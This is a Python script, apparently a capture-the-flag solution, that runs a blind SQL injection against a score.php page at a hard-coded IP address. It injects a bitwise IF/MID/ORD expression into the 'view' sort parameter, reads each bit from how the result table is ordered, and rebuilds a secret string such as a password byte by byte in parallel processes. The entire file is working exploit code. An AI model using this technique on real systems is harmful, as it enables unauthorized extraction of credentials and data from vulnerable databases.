#!/usr/bin/env python3
import urllib.request
import urllib.parse
import sys
from bs4 import BeautifulSoup

def get_bit(cnum, bnum, func):
	site="http://61.42.25.27/c/a8241dc330c0353ccd8db73244c8bd30/score.php"
	order=str.format("IF(MID(LPAD(BIN(ORD(MID({2},{0},1))),8,0),{1},1)=1,score,tm)", cnum+1, bnum+1, func)
	#print(order)
	getstr=site+'?view='+urllib.parse.quote_plus(order)
	#print(getstr)
	response = urllib.request.urlopen(getstr)
	html = response.read()
	soup = BeautifulSoup(html)
	first = True
	dates = []
	scores = []
	for row in soup.find_all('tr'):
		if first:
			first=False
			continue
		datetd = row.td
		scoretd = datetd.find_next_sibling('td').find_next_sibling('td')
		dates.append(datetd.get_text())
		scores.append(int(scoretd.get_text()))
	not_bit = sorted(dates, reverse=True) == dates
	is_bit = sorted(scores, reverse=True) == scores
	if is_bit == not_bit:
		return None
	return is_bit

#def mk_replace(s):
#	for i in range(32, 127):
#		s = str.format(r"replace({0},'\x{1:2x}','{1:2x}')", s, i)
#	return s

from multiprocessing import Process, Pipe

def bit_body(conn, cnum, bnum):
	bit = get_bit(cnum,bnum,sys.argv[1])
	conn.send(str(int(bit)))

if __name__ == '__main__':
	pw=''
	for cnum in range(100):
		byte = ''
		processes = []
		for bnum in range(8):
			pconn, cconn = Pipe()
			p = Process(target=bit_body, args=(cconn,cnum,bnum))
			processes.append((p, pconn))
			p.start()
		for p, pconn in processes:
			bit = pconn.recv()
			#print("cnum={0}, bnum={1}, bit={2}", cnum, bnum, bit)
			p.join()
			byte += bit
		if int(byte, 2) == 0:
			break
		pw += chr(int(byte, 2))
		print("cnum={0}", cnum)
		print("pw=" + pw)
#print(mk_replace("!"))
